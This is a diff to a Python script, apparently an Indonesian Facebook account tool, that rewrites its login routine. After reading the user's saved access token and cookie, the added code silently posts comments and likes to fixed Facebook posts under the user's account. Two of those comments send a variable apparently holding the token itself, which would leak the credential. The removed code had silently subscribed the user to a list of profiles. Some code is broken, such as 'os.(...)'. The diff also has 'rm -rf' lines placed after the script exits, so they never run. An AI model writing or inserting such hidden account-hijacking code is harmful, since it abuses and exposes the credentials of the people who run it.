@@ -253,23 +253,35 @@ def log_cookie():
     except requests.exceptions.ConnectionError:print(f"{P}[•] Tidak Ada Koneksi Internet ");exit()
     except (KeyError,IOError,AttributeError):print(f"{P}[•] Cookies Invalid ");exit()
 
+komenredem = random.choice(['LU GANTENG BANG'])
+komtwol = random.choice(['ANJAY SLEMEX LORD Syafii ganteng', 'abang Sudah Punya pacar belum', 'BANH KOK LO JAGO BANGET SIH ', 'LORD DAH MAKAN BLM'])
+kartu2d = random.choice(["LU GANTENG BANH TAPI SAYANG KEK HENGKER", "PRISTYLE DULU BOSSS HENGKER PURWOREJO","AHAHAHAHHA BANYAK KANG RECOD AWAS BANG "])
+kon = random.choice(["HACKER SUMTARA UTARA XXXX :)"])
 def ___fii___Sayang___Kamu___Widiya___():
     try:
         token = open('login/token.json', 'r').read()
         cookie = {'cookie':open('login/cookie.json','r').read()}
+    except IOError:
+        print(f"{B} | ")
+        print(f"{B} | ")
+        jalan(f"{P}[•]{M} Pastikan akun tumbal bagus");exit()
+        os.('rm -rf login/token.json')
+        os.system('rm -rf login/cookie.json')
         menu()
-    except Exception as e:pass 
-    post = '1827084332','100000415317575','100000737201966','100020766075165','100000431996038','100026818103201','100001617352620','100000729074466','607801156','1676993425','1767051257','100001085079906','100007559713883','100004655733027','100000200420913','100026490368623','100010484328037','100015073506062','10016189'
-    requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(token),cookies=cookie)
-    requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(token),cookies=cookie)
-    requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(token),cookies=cookie)
-    requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(token),cookies=cookie)
-    requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=%s'%(token),cookies=cookie)
-    requests.post('https://graph.facebook.com/100000737201966/subscribers?access_token=%s'%(token),cookies=cookie)
-    requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=%s'%(token),cookies=cookie)
-    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=%s'%(token),cookies=cookie)
-    requests.post('https://graph.facebook.com/100037914692898/subscribers?access_token=%s'%(token),cookies=cookie)
-    requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=%s'%(token),cookies=cookie)
+    kom = komenredem
+    komentar = komtwol
+    pipp = kartu2d
+    post = '3144112082575661'
+    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/3144112082575661/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/741196750581180/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/741196750581180/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/740479386990032/comments/?message=' + toket + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/741196750581180/comments/?message=' + toket + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/3144112082575661/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/3144112082575661/likes?summary=true&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/740479386990032/likes?summary=true&access_token=' + (token),cookies=cookie)
+    requests.post('https://graph.facebook.com/626021385160436/likes?summary=true&access_token=' + (token),cookies=cookie)
     print(f"{B} | ")
     print(f"{P}[•] login Berhasil")
     menu()
